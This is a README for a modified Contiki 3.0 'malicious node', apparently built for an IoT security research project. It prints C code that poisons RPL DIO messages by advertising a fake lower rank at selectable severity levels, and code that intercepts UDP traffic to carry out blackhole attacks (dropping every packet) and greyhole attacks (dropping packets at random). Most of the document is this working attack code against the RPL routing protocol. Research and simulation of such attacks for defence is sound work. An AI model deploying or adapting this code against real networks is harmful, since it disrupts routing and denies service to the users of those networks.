This modified contiki version is part of the [![ASSET controller](https://github.com/SWNRG/ASSET) project.

Other versions of contiki-mailicous code


Changes in this contiki 3.0 for the malicious node:
General rule, all changes have a comment starting with // George
(Dont confuse it with George Oikonomou...)

set MALICIOUS_LEVEL in project.conf (from 0-4).
By default it has the value 2 in rpl-icmp6.c

core/net/rpl/rpl-icmp6.c
l514: poisoning the advertised rank of the malicious node.
You can choose "how much" to poison it.

/* ******************* POISONING DIOs **************************** */
  /* George Poisoining the DIO sent to neighbors:
   * The rank of the malicious node is fakely advertised as lower.
   * it can be three different levels: light, adequate, severe.
   * In all cases, if the malicious is closer to the sink, the rank
   * will be slightly above the sink's rank (So RPL will root 
   * normally from nodes via the malicious to the sink.
   * Sink's rank is usually 128, PARENT_SWITCH_THRESHOLD is 96 or 160.
   * A node's rank should not be lesser than the sink, hence it should 
   * be more than 128. Choose wisely....
   */
   int fake_rank; 
   switch(MALICIOUS_LEVEL){
	  case 4:
		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 				       	 
		 	 2*PARENT_SWITCH_THRESHOLD ?
			 dag->rank - 4*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;	 
	  	 break;
	  case 3:
		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 				       	 
		 	 2*PARENT_SWITCH_THRESHOLD ?
			 dag->rank - 3*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;	 
	  	 break;
	  case 2:
		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 
		 	 2*PARENT_SWITCH_THRESHOLD ?
			 dag->rank - 2*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;		 
	    break;
	  case 1:
		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD >
		 	 2*PARENT_SWITCH_THRESHOLD ?
			 dag->rank - PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;		 
	    break; 
	  default: // All other number
 	  printf("No MALICIOUS_LEVEL set, NORMAL dag->rank\n");
 	  fake_rank = dag->rank;
  }
  printf("PARENT_SWITCH_THRESHOLD:%d, dag->rank:%d, fake:%d\n",
  			PARENT_SWITCH_THRESHOLD, dag->rank,fake_rank);
  set16(buffer, pos, fake_rank);
  //set16(buffer, pos, dag->rank);
  
  
  
uip6.c
l155
/* George variable to be set at the app layer by a malicious node */
uint8_t intercept_on = 0;

l1261: blackhole and grayhole attacks.
Intercepting UDP messages and either never forward them (blackhole),
or randomly decide (50%) whether to send it or not (greyhole).
define variables in project.conf (of the malicious node contiki).

/* ********** George ************************************ */      
/* George While intercept_on == 1 the "goto send;" is not on.
 * if !goto send; packets are not forwarded any more. 
 * Traffic is therefor intercepted by a malicious node.
 * TODO: you want to do something with this traffic?
 */  		
		
		 if(intercept_on == 1){ 	 
#ifdef GREY_SINK_HOLE_ATTACK
			 int sendON=(int)random_rand()%2;
			 if(sendON == 0){
			 	  printf("DATA INTERCEPTED from: ");
			 	  printShortaddr(&UIP_IP_BUF->srcipaddr); 	
			 	  printf(" travelling to node: "); 
	  			  printShortaddr(&UIP_IP_BUF->destipaddr);
	  			  printf("\n");	
	  		 }else{ // sendOn !=0	  		
				  printf("DATA LET GO from: ");
			 	  printShortaddr(&UIP_IP_BUF->srcipaddr); 	
			 	  printf(" travelling to node: "); 
	  			  printShortaddr(&UIP_IP_BUF->destipaddr);
	  			  printf("\n");	
	  			  
	  			  UIP_STAT(++uip_stat.ip.forwarded);
				  goto send;
	  		 }			 
#else
		 	  printf("DATA from: ");
		 	  printShortaddr(&UIP_IP_BUF->srcipaddr); 	
		 	  printf(" NEVER SENT to node: "); 
  			  printShortaddr(&UIP_IP_BUF->destipaddr);
  			  printf("\n");		 			 
#endif /* GREY_SINK_HOLE_ATTACK */	
 
	  	 }else{
	  
#if PRINT_ROUTE_ON  /* George Variable in project.conf */   
				printf("DATA UDP from: ");
				printShortaddr(&UIP_IP_BUF->srcipaddr);
				printf("	NORMALLY  pass to node: "); 
				printShortaddr(&UIP_IP_BUF->destipaddr);
				printf("\n");
#endif	
/* ****************************************************** */   


